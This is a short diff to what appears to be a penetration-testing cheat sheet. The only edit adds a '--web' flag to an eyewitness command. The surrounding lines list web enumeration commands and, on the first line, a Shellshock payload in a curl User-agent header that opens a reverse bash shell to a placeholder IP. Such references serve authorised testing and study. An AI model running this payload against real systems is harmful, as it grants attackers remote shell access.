@@ -95,7 +95,7 @@ $ curl -i -H "User-agent: () { :;}; /bin/bash -i >& /dev/tcp/<IP address>/443 0>
 $ feroxbuster -w <wordlist> -u <URL>
 $ wfuzz -c -w <wordlist> -u http://FUZZ.<domain>
 $ nikto -h <IP address>
-$ eyewitness -f <URL list.txt>
+$ eyewitness -f <URL list.txt> --web
 $ curl -v -X OPTIONS <IP address>
 $ curl http://<IP address> --upload-file test.txt
 $ curl -X PUT http://<IP address>/test.txt -d @test.txt
